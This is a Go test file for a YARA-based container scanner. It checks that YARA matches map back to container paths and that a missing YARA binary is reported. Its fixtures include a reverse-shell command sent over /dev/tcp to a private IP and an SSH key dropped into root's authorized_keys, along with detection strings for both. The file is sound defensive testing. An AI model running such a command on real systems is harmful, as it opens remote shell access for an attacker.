package yarascan

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

type fakeCommandRunner struct {
	byKey map[string]string
}

func (f *fakeCommandRunner) ExecCommand(_ context.Context, _ string, cmd []string) (string, error) {
	key := strings.Join(cmd, " ")
	return f.byKey[key], nil
}

type fakeBinaryRunner struct{}

func (fakeBinaryRunner) LookPath(file string) (string, error) {
	return "/usr/bin/" + file, nil
}

func (fakeBinaryRunner) Output(_ string, args ...string) ([]byte, error) {
	scanDir := args[len(args)-1]
	matches := []string{}
	entries, err := os.ReadDir(scanDir)
	if err != nil {
		return nil, err
	}
	for _, entry := range entries {
		if entry.IsDir() || !strings.HasPrefix(entry.Name(), "candidate-") {
			continue
		}
		path := filepath.Join(scanDir, entry.Name())
		data, err := os.ReadFile(path)
		if err != nil {
			return nil, err
		}
		text := string(data)
		if strings.Contains(text, "bash -i") {
			matches = append(matches, "BoneStackReverseShell "+path)
		}
		if strings.Contains(text, "authorized_keys") || strings.Contains(text, "ssh-rsa") {
			matches = append(matches, "BoneStackSSHKeyDrop "+path)
		}
	}
	return []byte(strings.Join(matches, "\n")), nil
}

func TestScanLiveMapsYARAMatchesBackToContainerPaths(t *testing.T) {
	scanner := NewScanner(&fakeCommandRunner{
		byKey: map[string]string{
			strings.Join(candidateFileCommand(), " "):                        "/tmp/revshell.sh\n/root/.ssh/authorized_keys",
			strings.Join(fileReadCommand("/tmp/revshell.sh"), " "):           "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
			strings.Join(fileReadCommand("/root/.ssh/authorized_keys"), " "): "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ",
		},
	})
	scanner.binary = fakeBinaryRunner{}

	findings, err := scanner.ScanLive(context.Background(), "abc123")
	if err != nil {
		t.Fatalf("ScanLive failed: %v", err)
	}
	if len(findings) != 2 {
		t.Fatalf("expected 2 findings, got %d", len(findings))
	}
	if findings[0].Path == findings[1].Path {
		t.Fatalf("expected distinct paths, got %#v", findings)
	}
}

func TestScanLiveReturnsUnavailableWhenYARAMissing(t *testing.T) {
	scanner := NewScanner(&fakeCommandRunner{})
	scanner.binary = missingBinaryRunner{}

	_, err := scanner.ScanLive(context.Background(), "abc123")
	if err != ErrYARANotInstalled {
		t.Fatalf("expected ErrYARANotInstalled, got %v", err)
	}
}

type missingBinaryRunner struct{}

func (missingBinaryRunner) LookPath(string) (string, error) { return "", os.ErrNotExist }
func (missingBinaryRunner) Output(string, ...string) ([]byte, error) {
	return nil, os.ErrNotExist
}
